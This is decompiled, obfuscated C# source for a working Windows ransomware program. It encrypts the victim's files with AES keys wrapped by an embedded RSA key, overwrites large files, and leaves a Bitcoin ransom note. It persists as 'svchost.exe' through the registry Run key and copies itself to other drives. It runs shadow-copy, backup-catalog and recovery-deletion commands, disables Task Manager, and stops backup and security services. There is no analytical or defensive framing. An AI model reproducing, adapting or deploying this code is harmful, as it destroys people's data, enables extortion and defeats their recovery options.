using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.ServiceProcess;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using ConsoleApplication7;
using Microsoft.Win32;

internal class a
{
	public static class a
	{
		public const int a = 797;

		public static IntPtr b = new IntPtr(-3);

		[DllImport("user32.dll", EntryPoint = "AddClipboardFormatListener", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool a(IntPtr a);

		[DllImport("user32.dll", EntryPoint = "SetParent", SetLastError = true)]
		public static extern IntPtr b(IntPtr a, IntPtr b);
	}

	[CompilerGenerated]
	private sealed class b
	{
		public string a;
	}

	[CompilerGenerated]
	private sealed class c
	{
		private sealed class a
		{
			public c a;

			public b b;

			public string c;

			public bool a(string a)
			{
				return a == c.ToLower();
			}
		}

		public b a;

		public string[] b;

		public bool c;

		public string[] d;

		public void a(int a)
		{
			try
			{
				b b2 = this.a;
				string c = Path.GetExtension(this.b[a]);
				string fileName = Path.GetFileName(this.b[a]);
				if (!Array.Exists(global::a.m_ad, (string a) => a == c.ToLower()) || !(fileName != global::a.m_q))
				{
					return;
				}
				FileInfo fileInfo = new FileInfo(this.b[a]);
				try
				{
					fileInfo.Attributes = FileAttributes.Normal;
				}
				catch
				{
				}
				string text = m(40);
				if (fileInfo.Length < 2368709120u)
				{
					if (k(this.b[a]))
					{
						string text2 = q(text, l());
						n(this.b[a], text, text2);
					}
				}
				else
				{
					o(this.b[a], text, fileInfo.Length);
				}
				if (this.c)
				{
					this.c = false;
					string path = this.a.a + "/" + global::a.m_q;
					string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory);
					if (!File.Exists(path) && this.a.a != folderPath)
					{
						File.WriteAllLines(path, global::a.m_ac);
					}
				}
			}
			catch (Exception)
			{
			}
		}

		public void b(int a)
		{
			try
			{
				new DirectoryInfo(d[a]).Attributes &= ~FileAttributes.Normal;
			}
			catch
			{
			}
			j(d[a]);
		}
	}

	[CompilerGenerated]
	private sealed class d
	{
		public string a;

		public bool a(string a)
		{
			return a == this.a;
		}
	}

	private static readonly byte[] m_a;

	private static string m_b;

	private static string m_c;

	public static string d;

	public static bool e;

	public static string f;

	private static bool m_g;

	private static string m_h;

	private static bool m_i;

	private static string m_j;

	public static string k;

	private static bool m_l;

	private static bool m_m;

	private static int m_n;

	private static string m_o;

	public static string p;

	private static string m_q;

	private static bool m_r;

	private static bool m_s;

	private static bool m_t;

	private static bool m_u;

	private static bool m_v;

	private static bool m_w;

	public static string x;

	public static string y;

	public static string z;

	public static string aa;

	public static readonly Regex ab;

	private static List<string> m_ac;

	private static string[] m_ad;

	private static Random m_ae;

	[CompilerGenerated]
	private static ThreadStart m_af;

	[DllImport("user32.dll", CharSet = CharSet.Auto, EntryPoint = "SystemParametersInfo")]
	private static extern int a(uint a, uint b, string c, uint d);

	private static void Main(string[] a)
	{
		//IL_009e: Unknown result type (might be due to invalid IL or missing references)
		DateTime dateTime = new DateTime((-479968907 ^ -479969307) >> 4, (-(397516 - -603873142) ^ -604270662) >> 1, ~((-949333300 - -617940308) ^ 0x13C0A7D1), -202573186 - -202573188, ~(426755714 - -668850446 + -686109363 - 409496819), 36 << 6 >> 7);
		if ((dateTime - DateTime.Now).TotalDays < 0.0)
		{
			throw new ArgumentOutOfRangeException();
		}
		if (c())
		{
			MessageBox.Show("Forbidden Country");
			return;
		}
		if (e())
		{
			new Thread((ThreadStart)delegate
			{
				b();
			}).Start();
		}
		if (w())
		{
			return;
		}
		if (f())
		{
			Environment.Exit(1);
		}
		if (global::a.m_m)
		{
			d();
		}
		if (global::a.m_r)
		{
			t(global::a.m_j);
		}
		else if (global::a.m_i)
		{
			s(global::a.m_j);
		}
		if (global::a.m_l)
		{
			x();
		}
		if (global::a.m_r)
		{
			if (global::a.m_s)
			{
				aa();
			}
			if (global::a.m_t)
			{
				ab();
			}
			if (global::a.m_u)
			{
				ac();
			}
			if (global::a.m_v)
			{
				ad();
			}
			if (global::a.m_w)
			{
				ae();
			}
		}
		r();
		if (global::a.m_g)
		{
			y(global::a.m_h);
		}
		v();
		af(global::a.m_o);
	}

	public static void b()
	{
		DateTime dateTime = new DateTime(-(~32399 >> 4), (0xA6BFC7D ^ 0xA6BFC3D) >> 5, ~(-675803617 + 675803602));
		if (DateTime.Now > dateTime && 0 == 0)
		{
			int num = ~(0x1B36727B ^ -456553084);
			num = (-(--693871113) + 693871114) / num;
		}
		Application.Run((Form)(object)new driveNotification.NotificationForm());
	}

	private static bool c()
	{
		DateTime dateTime = default(DateTime).AddYears(~-2025).AddMonths(-488862828 - -488862829 << 6 >> 6).AddDays(12.6281712962963);
		if ((DateTime.Now - dateTime).TotalDays > 0.0)
		{
			throw new ArgumentException();
		}
		string[] array = new string[2] { "az-Latn-AZ", "tr-TR" };
		string[] array2 = array;
		foreach (string text in array2)
		{
			try
			{
				string name = InputLanguage.CurrentInputLanguage.Culture.Name;
				if (name == text)
				{
					return true;
				}
			}
			catch
			{
			}
		}
		return false;
	}

	private static void d()
	{
		string directoryName = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location);
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		if (directoryName != folderPath)
		{
			Thread.Sleep(global::a.m_n * 1000);
		}
	}

	private static bool e()
	{
		try
		{
			using RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\" + global::a.k);
			object value = registryKey.GetValue(global::a.k);
			registryKey.Close();
			if (value.ToString().Length > 0)
			{
				return false;
			}
			return true;
		}
		catch
		{
			return true;
		}
	}

	private static bool f()
	{
		Process[] processes = Process.GetProcesses();
		Process currentProcess = Process.GetCurrentProcess();
		Process[] array = processes;
		foreach (Process process in array)
		{
			try
			{
				if (process.Modules[0].FileName == Assembly.GetExecutingAssembly().Location && currentProcess.Id != process.Id)
				{
					return true;
				}
			}
			catch (Exception)
			{
			}
		}
		return false;
	}

	public static string g(int a)
	{
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < a; i++)
		{
			char value = "abcdefghijklmnopqrstuvwxyz0123456789"[global::a.m_ae.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
			stringBuilder.Append(value);
		}
		return stringBuilder.ToString();
	}

	public static string h(int a)
	{
		if (global::a.f == "")
		{
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < a; i++)
			{
				char value = "abcdefghijklmnopqrstuvwxyz0123456789"[global::a.m_ae.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
				stringBuilder.Append(value);
			}
			return stringBuilder.ToString();
		}
		return global::a.f;
	}

	public static string i(string a)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(a);
		return Convert.ToBase64String(bytes);
	}

	private static void j(string a)
	{
		try
		{
			string[] b2 = Directory.GetFiles(a);
			bool c = true;
			Parallel.For(0, b2.Length, delegate(int a)
			{
				try
				{
					string c2 = Path.GetExtension(b2[a]);
					string fileName = Path.GetFileName(b2[a]);
					if (Array.Exists(global::a.m_ad, (string a) => a == c2.ToLower()) && fileName != global::a.m_q)
					{
						FileInfo fileInfo = new FileInfo(b2[a]);
						try
						{
							fileInfo.Attributes = FileAttributes.Normal;
						}
						catch
						{
						}
						string text = m(40);
						if (fileInfo.Length < 2368709120u)
						{
							if (k(b2[a]))
							{
								string text2 = q(text, l());
								n(b2[a], text, text2);
							}
						}
						else
						{
							o(b2[a], text, fileInfo.Length);
						}
						if (c)
						{
							c = false;
							string path = a + "/" + global::a.m_q;
							string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory);
							if (!File.Exists(path) && a != folderPath)
							{
								File.WriteAllLines(path, global::a.m_ac);
							}
						}
					}
				}
				catch (Exception)
				{
				}
			});
			string[] d = Directory.GetDirectories(a);
			Parallel.For(0, d.Length, delegate(int a)
			{
				try
				{
					new DirectoryInfo(d[a]).Attributes &= ~FileAttributes.Normal;
				}
				catch
				{
				}
				j(d[a]);
			});
		}
		catch (Exception)
		{
		}
	}

	private static bool k(string a)
	{
		a = a.ToLower();
		string[] array = new string[16]
		{
			"appdata\\local", "appdata\\locallow", "users\\all users", "\\ProgramData", "boot.ini", "bootfont.bin", "boot.ini", "iconcache.db", "ntuser.dat", "ntuser.dat.log",
			"ntuser.ini", "thumbs.db", "autorun.inf", "bootsect.bak", "bootmgfw.efi", "desktop.ini"
		};
		string[] array2 = array;
		foreach (string value in array2)
		{
			if (a.Contains(value))
			{
				return false;
			}
		}
		return true;
	}

	public static string l()
	{
		StringBuilder stringBuilder = new StringBuilder();
		stringBuilder.AppendLine("<?xml version=\"1.0\" encoding=\"utf-16\"?>");
		stringBuilder.AppendLine("<RSAParameters xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">");
		stringBuilder.AppendLine("  <Exponent>AQAB</Exponent>");
		stringBuilder.AppendLine("  <Modulus>scPQcLsXZ1ikyVOWuUqt4M74rovkGqBQpMFTHhqni36YcGo4kXEu5j1r72UsgHQyBEawY+qKcMMjxNY9Rj0aBSb2ofpnHPn6pQmukId3dI91Zr4XFOLr3QEeZO66ae18v74snR6v2mJciz5q6bSHPOm1iBu7btsUv5U4+bBn7NP29VBMHDucZLzyItK04wx6qcA4A1KdRkgcq2UCo01P6ug6p7tGzbKW47Pqo1t1PVgycEAlWrlg04fhtJHNtROqCpxcfK2D1U5SQMdDklRpB9EtqJYeC5eWfts0OSgswxiaOSUFe+d/ZZzdRMHe3iUw8ntyodZuyXswdj9os9iNcQ==</Modulus>");
		stringBuilder.AppendLine("</RSAParameters>");
		return stringBuilder.ToString();
	}

	public static string m(int a)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < a--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
		}
		return stringBuilder.ToString();
	}

	private static void n(string a, string b, string c)
	{
		string path = a + "." + h(4);
		byte[] array = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		FileStream fileStream = new FileStream(path, FileMode.Create);
		byte[] bytes = Encoding.UTF8.GetBytes(b);
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 128;
		rijndaelManaged.BlockSize = 128;
		rijndaelManaged.Padding = PaddingMode.PKCS7;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(bytes, array, 1);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		fileStream.Write(array, 0, array.Length);
		CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
		FileStream fileStream2 = new FileStream(a, FileMode.Open);
		fileStream2.CopyTo(cryptoStream);
		fileStream2.Flush();
		fileStream2.Close();
		cryptoStream.Flush();
		cryptoStream.Close();
		fileStream.Close();
		using (FileStream stream = new FileStream(path, FileMode.Append, FileAccess.Write))
		{
			using StreamWriter streamWriter = new StreamWriter(stream);
			streamWriter.Write(c);
			streamWriter.Flush();
			streamWriter.Close();
		}
		File.WriteAllText(a, "?");
		File.Delete(a);
	}

	private static void o(string a, string b, long c)
	{
		p();
		using FileStream fileStream = new FileStream(a + "." + h(4), FileMode.Create, FileAccess.Write, FileShare.None);
		fileStream.SetLength(c);
		File.WriteAllText(a, "?");
		File.Delete(a);
	}

	public static byte[] p()
	{
		byte[] array = new byte[32];
		using RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		for (int i = 0; i < 10; i++)
		{
			rNGCryptoServiceProvider.GetBytes(array);
		}
		return array;
	}

	public static string q(string a, string b)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(a);
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(2048);
		try
		{
			rSACryptoServiceProvider.FromXmlString(b.ToString());
			byte[] inArray = rSACryptoServiceProvider.Encrypt(bytes, fOAEP: true);
			return Convert.ToBase64String(inArray);
		}
		finally
		{
			rSACryptoServiceProvider.PersistKeyInCsp = false;
		}
	}

	private static void r()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			string pathRoot = Path.GetPathRoot(Environment.SystemDirectory);
			if (driveInfo.ToString() == pathRoot)
			{
				string[] array = new string[12]
				{
					"Program Files", "Program Files (x86)", "Windows", "$Recycle.Bin", "MSOCache", "Documents and Settings", "Intel", "PerfLogs", "Windows.old", "AMD",
					"NVIDIA", "ProgramData"
				};
				string[] directories = Directory.GetDirectories(pathRoot);
				for (int j = 0; j < directories.Length; j++)
				{
					DirectoryInfo directoryInfo = new DirectoryInfo(directories[j]);
					string a2 = directoryInfo.Name;
					if (!Array.Exists(array, (string a) => a == a2))
					{
						global::a.j(directories[j]);
					}
				}
			}
			else
			{
				global::a.j(driveInfo.ToString());
			}
		}
	}

	private static void s(string a)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + a;
		if (!(friendlyName != a) && !(location != text2))
		{
			return;
		}
		byte[] bytes = File.ReadAllBytes(location);
		if (!File.Exists(text2))
		{
			File.WriteAllBytes(text2, bytes);
			ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
			processStartInfo.WorkingDirectory = text;
			Process process = new Process();
			process.StartInfo = processStartInfo;
			if (process.Start())
			{
				Environment.Exit(1);
			}
			return;
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.WriteAllBytes(text2, bytes);
		}
		catch
		{
		}
		ProcessStartInfo processStartInfo2 = new ProcessStartInfo(text2);
		processStartInfo2.WorkingDirectory = text;
		Process process2 = new Process();
		process2.StartInfo = processStartInfo2;
		if (process2.Start())
		{
			Environment.Exit(1);
		}
	}

	private static void t(string a)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + a;
		ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
		processStartInfo.UseShellExecute = true;
		processStartInfo.Verb = "runas";
		processStartInfo.WindowStyle = ProcessWindowStyle.Normal;
		processStartInfo.WorkingDirectory = text;
		ProcessStartInfo startInfo = processStartInfo;
		Process process = new Process();
		process.StartInfo = startInfo;
		if (!(friendlyName != a) && !(location != text2))
		{
			return;
		}
		byte[] bytes = File.ReadAllBytes(location);
		if (!File.Exists(text2))
		{
			File.WriteAllBytes(text2, bytes);
			try
			{
				Process.Start(startInfo);
				Environment.Exit(1);
				return;
			}
			catch (Win32Exception ex)
			{
				if (ex.NativeErrorCode == 1223)
				{
					t(a);
				}
				return;
			}
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.WriteAllBytes(text2, bytes);
		}
		catch
		{
		}
		try
		{
			Process.Start(startInfo);
			Environment.Exit(1);
		}
		catch (Win32Exception ex2)
		{
			if (ex2.NativeErrorCode == 1223)
			{
				t(a);
			}
		}
	}

	private static void u()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
		string processName = Process.GetCurrentProcess().ProcessName;
		using StreamWriter streamWriter = new StreamWriter(folderPath + "\\" + processName + ".url");
		string location = Assembly.GetExecutingAssembly().Location;
		streamWriter.WriteLine("[InternetShortcut]");
		streamWriter.WriteLine("URL=file:///" + location);
		streamWriter.WriteLine("IconIndex=0");
		string text = location.Replace('\\', '/');
		streamWriter.WriteLine("IconFile=" + text);
	}

	private static void v()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + global::a.m_q;
		try
		{
			if (!File.Exists(text))
			{
				File.WriteAllLines(text, global::a.m_ac);
			}
			Thread.Sleep(500);
			Process.Start(text);
		}
		catch
		{
		}
	}

	private static bool w()
	{
		string location = Assembly.GetExecutingAssembly().Location;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + global::a.m_j;
		string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + global::a.m_q;
		if (location != text)
		{
			try
			{
				File.Delete(path);
			}
			catch
			{
			}
		}
		if (File.Exists(path) && location == text)
		{
			return true;
		}
		return false;
	}

	private static void x()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("UpdateTask", Assembly.GetExecutingAssembly().Location);
		}
		catch
		{
		}
	}

	private static void y(string a)
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != Path.GetPathRoot(Environment.SystemDirectory) && !File.Exists(driveInfo.ToString() + a))
			{
				try
				{
					File.Copy(Assembly.GetExecutingAssembly().Location, driveInfo.ToString() + a);
				}
				catch
				{
				}
			}
		}
	}

	private static void z(string a)
	{
		Process process = new Process();
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "cmd.exe";
		processStartInfo.Arguments = "/C " + a;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo = processStartInfo;
		process.Start();
		process.WaitForExit();
	}

	private static void aa()
	{
		z("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");
	}

	private static void ab()
	{
		z("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");
	}

	private static void ac()
	{
		z("wbadmin delete catalog -quiet");
	}

	public static void ad()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
			registryKey.SetValue("DisableTaskMgr", "1");
			registryKey.Close();
		}
		catch
		{
		}
	}

	private static void ae()
	{
		//IL_018a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0190: Expected O, but got Unknown
		string[] array = new string[42]
		{
			"BackupExecAgentBrowser", "BackupExecDiveciMediaService", "BackupExecJobEngine", "BackupExecManagementService", "vss", "sql", "svc$", "memtas", "sophos", "veeam",
			"backup", "GxVss", "GxBlr", "GxFWD", "GxCVD", "GxCIMgr", "DefWatch", "ccEvtMgr", "SavRoam", "RTVscan",
			"QBFCService", "Intuit.QuickBooks.FCS", "YooBackup", "YooIT", "zhudongfangyu", "sophos", "stc_raw_agent", "VSNAPVSS", "QBCFMonitorService", "VeeamTransportSvc",
			"VeeamDeploymentService", "VeeamNFSSvc", "veeam", "PDVFSService", "BackupExecVSSProvider", "BackupExecAgentAccelerator", "BackupExecRPCService", "AcrSch2Svc", "AcronisAgent", "CASAD2DWebSvc",
			"CAARCUpdateSvc", "TeamViewer"
		};
		string[] array2 = array;
		foreach (string text in array2)
		{
			try
			{
				ServiceController val = new ServiceController(text);
				val.Stop();
			}
			catch
			{
			}
		}
	}

	public static void af(string a)
	{
		if (a != "")
		{
			try
			{
				string path = Path.GetTempPath() + g(9) + ".jpg";
				File.WriteAllBytes(path, Convert.FromBase64String(a));
				global::a.a(20u, 0u, path, 3u);
			}
			catch
			{
			}
		}
	}

	[CompilerGenerated]
	private static void ag()
	{
		b();
	}

	static a()
	{
		DateTime dateTime = new DateTime((1766275374 - -155846994 >> 3) + -240263271, -(~1), ~237720083 + 237720097, --181880875 - 181880853, ~(1606881362 + -236364542 >> 1) - -685258463, -((-1058217099 ^ 0x1A9AE776) - -629799919));
		if ((dateTime - DateTime.Now).TotalDays < 0.0)
		{
			int num = -0 >> 3;
			num = ~(-448859656 ^ 0x1AC10E06) / num;
		}
		global::a.m_a = new byte[32];
		global::a.m_b = Environment.UserName;
		global::a.m_c = "C:\\Users\\";
		global::a.d = "v45hchdrg72ns7m6jmy";
		global::a.e = true;
		global::a.f = "";
		global::a.m_g = true;
		global::a.m_h = "surprise.exe";
		global::a.m_i = true;
		global::a.m_j = "svchost.exe";
		global::a.k = "oAnWieozQPsRK7Bj83r4";
		global::a.m_l = true;
		global::a.m_m = false;
		global::a.m_n = 10;
		global::a.m_o = "#base64Image";
		global::a.p = "1qrx0frdqdur0lllc6ezm";
		global::a.m_q = "read_it.txt";
		global::a.m_r = true;
		global::a.m_s = true;
		global::a.m_t = true;
		global::a.m_u = true;
		global::a.m_v = true;
		global::a.m_w = true;
		global::a.x = "19DpJAWr6NCVT2";
		global::a.y = global::a.x + global::a.k;
		global::a.z = "bc";
		global::a.aa = global::a.z + global::a.p + global::a.d;
		global::a.ab = new Regex("(?:[13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})");
		global::a.m_ac = new List<string>
		{
			"Don't worry, you can return all your files!", "", "All your files like documents, photos, databases and other important are encrypted", "", "What guarantees do we give to you?", "", "You can send 3 of your encrypted files and we decrypt it for free.", "", "You must follow these steps To decrypt your files :   ", "1) Write on our e-mail :test@test.com ( In case of no answer in 24 hours check your spam folder",
			"or write us to this e-mail: test2@test.com)", "", "2) Obtain Bitcoin (You have to pay for decryption in Bitcoins. ", "After payment we will send you the tool that will decrypt all your files.)"
		};
		global::a.m_ad = new string[230]
		{
			".txt", ".jar", ".dat", ".contact", ".settings", ".doc", ".docx", ".xls", ".xlsx", ".ppt",
			".pptx", ".odt", ".jpg", ".mka", ".mhtml", ".oqy", ".png", ".csv", ".py", ".sql",
			".mdb", ".php", ".asp", ".aspx", ".html", ".htm", ".xml", ".psd", ".pdf", ".xla",
			".cub", ".dae", ".indd", ".cs", ".mp3", ".mp4", ".dwg", ".zip", ".rar", ".mov",
			".rtf", ".bmp", ".mkv", ".avi", ".apk", ".lnk", ".dib", ".dic", ".dif", ".divx",
			".iso", ".7zip", ".ace", ".arj", ".bz2", ".cab", ".gzip", ".lzh", ".tar", ".jpeg",
			".xz", ".mpeg", ".torrent", ".mpg", ".core", ".pdb", ".ico", ".pas", ".db", ".wmv",
			".swf", ".cer", ".bak", ".backup", ".accdb", ".bay", ".p7c", ".exif", ".vss", ".raw",
			".m4a", ".wma", ".flv", ".sie", ".sum", ".ibank", ".wallet", ".css", ".js", ".rb",
			".crt", ".xlsm", ".xlsb", ".7z", ".cpp", ".java", ".jpe", ".ini", ".blob", ".wps",
			".docm", ".wav", ".3gp", ".webm", ".m4v", ".amv", ".m4p", ".svg", ".ods", ".bk",
			".vdi", ".vmdk", ".onepkg", ".accde", ".jsp", ".json", ".gif", ".log", ".gz", ".config",
			".vb", ".m1v", ".sln", ".pst", ".obj", ".xlam", ".djvu", ".inc", ".cvs", ".dbf",
			".tbi", ".wpd", ".dot", ".dotx", ".xltx", ".pptm", ".potx", ".potm", ".pot", ".xlw",
			".xps", ".xsd", ".xsf", ".xsl", ".kmz", ".accdr", ".stm", ".accdt", ".ppam", ".pps",
			".ppsm", ".1cd", ".3ds", ".3fr", ".3g2", ".accda", ".accdc", ".accdw", ".adp", ".ai",
			".ai3", ".ai4", ".ai5", ".ai6", ".ai7", ".ai8", ".arw", ".ascx", ".asm", ".asmx",
			".avs", ".bin", ".cfm", ".dbx", ".dcm", ".dcr", ".pict", ".rgbe", ".dwt", ".f4v",
			".exr", ".kwm", ".max", ".mda", ".mde", ".mdf", ".mdw", ".mht", ".mpv", ".msg",
			".myi", ".nef", ".odc", ".geo", ".swift", ".odm", ".odp", ".oft", ".orf", ".pfx",
			".p12", ".pl", ".pls", ".safe", ".tab", ".vbs", ".xlk", ".xlm", ".xlt", ".xltm",
			".svgz", ".slk", ".tar.gz", ".dmg", ".ps", ".psb", ".tif", ".rss", ".key", ".vob",
			".epsp", ".dc3", ".iff", ".onepkg", ".onetoc2", ".opt", ".p7b", ".pam", ".r3d", ".ova"
		};
		global::a.m_ae = new Random();
	}
}
